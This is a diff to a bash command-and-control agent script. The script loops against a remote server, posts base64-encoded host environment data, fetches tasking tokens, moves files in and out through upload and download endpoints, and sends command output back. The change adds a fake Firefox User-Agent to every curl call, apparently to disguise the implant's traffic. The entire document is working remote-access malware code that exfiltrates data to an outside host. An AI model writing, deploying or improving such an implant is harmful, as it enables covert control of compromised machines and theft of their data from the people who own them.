@@ -8,6 +8,7 @@
 server="$2"
 sleeps="$4"
 pwdnew="$(echo $PWD)"
+cagent="Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"
 
 # Help
 if [[ $1 == *-h* ]] || [[ -z $2 ]]; then
@@ -53,8 +54,8 @@ while true; do
   fi
   
   env=$(GetEnv) ; getenv64=$(R64Encoder -t "$env")
-  request1=$(curl -s -k -X POST "$server/api/info" -d "Info: $getenv64")
-  response=$(curl -s -k "$server/api/token")
+  request1=$(curl -A "$cagent" -s -k -X POST "$server/api/info" -d "Info: $getenv64")
+  response=$(curl -A "$cagent" -s -k "$server/api/token")
   token=$(echo "$response" | grep -oP "Token: \K.*")
   invoke64=$(R64Decoder -t "$token") ; param="Debug"
 
@@ -65,7 +66,7 @@ while true; do
 
       if [[ $invoke64 == upload* ]]; then
          file_path=$(echo $invoke64 | cut -d " " -f 3)
-         file_request=$(curl -s -k -X GET "$server/api/download")
+         file_request=$(curl -A "$cagent" -s -k -X GET "$server/api/download")
          file_content=$(echo "$file_request" | grep -oP "File: \K.*")
          R64Decoder -t "$file_content" > "$file_path"
          continue
@@ -74,7 +75,7 @@ while true; do
       if [[ $invoke64 == download* ]]; then
          file_path=$(echo $invoke64 | cut -d " " -f 2)
          file_content=$(R64Encoder -f "$file_path")
-         download=$(curl -s -k -X POST "$server/api/upload" -d "File: $file_content")
+         download=$(curl -A "$cagent" -s -k -X POST "$server/api/upload" -d "File: $file_content")
          continue
       fi
 
@@ -103,9 +104,9 @@ while true; do
       path=$(echo "$param" | tr "[:upper:]" "[:lower:]")
 
       if [ "$param" == "Error" ]; then
-         request2=$(curl -s -k -X POST "$server/api/error" -d "error: $output64")
+         request2=$(curl -A "$cagent" -s -k -X POST "$server/api/error" -d "error: $output64")
       else
-         request2=$(curl -s -k -X POST "$server/api/$path" -d "$param: $output64")
+         request2=$(curl -A "$cagent" -s -k -X POST "$server/api/$path" -d "$param: $output64")
       fi
    fi
 done
